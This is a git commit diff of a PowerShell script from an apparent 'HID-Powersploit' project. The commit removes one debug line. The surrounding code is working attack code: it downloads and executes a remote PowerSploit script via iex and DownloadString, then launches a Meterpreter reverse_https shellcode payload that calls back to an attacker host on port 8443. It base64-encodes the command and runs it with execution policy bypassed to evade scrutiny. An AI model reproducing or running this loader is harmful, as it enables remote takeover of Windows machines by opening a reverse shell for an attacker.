c41d518e60718ef8ed87b16e1c69059a74d2410d
Burnd9671 <Burnd9671@gmail.com>
2016-03-06 18:30:56 -0500

    Update AutoHIDv1.ps1

--- auto-hid/AutoHIDv1.ps1
+++ auto-hid/AutoHIDv1.ps1
@@ -13,7 +13,6 @@ catch {
     }
 $url = '"https://github.com/Burnd9671/HID-Powersploit/raw/master/var/www/html/Invoke-Powersploit"'
 $rawcmd = "iex (New-Object Net.WebClient).DownloadString($url); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $DevIP -Lport 8443 -Force"
-Echo $rawcmd > "C:\Users\Bryan Louiselle\Desktop\Raw_Command.txt"
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($rawcmd)
 $obfscmd = [Convert]::ToBase64String($bytes)
 Powershell.exe -Exec Bypass -Nol -Enc $obfscmd
